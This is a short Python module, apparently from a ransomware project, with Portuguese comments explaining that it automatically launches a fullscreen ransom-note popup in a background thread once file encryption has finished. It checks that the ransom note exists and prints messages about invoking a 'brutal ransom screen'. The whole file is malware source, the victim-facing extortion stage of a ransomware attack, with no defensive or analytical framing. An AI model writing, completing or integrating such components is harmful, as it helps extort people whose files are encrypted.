# ransom/auto_popup_stager.py
import os
import threading
from ransom.popup_launcher import launch_fullscreen_popup

def auto_invoke_popup(note_path: str):
    """
    Inicia a popup em segundo plano automaticamente
    ao final do processo de criptografia.
    """
    if not os.path.exists(note_path):
        print(f"[⚠️] Nota de resgate não encontrada: {note_path}")
        return

    print(f"[🧨] Invocando tela de resgate brutal: {note_path}")
    threading.Thread(target=launch_fullscreen_popup, daemon=True).start()
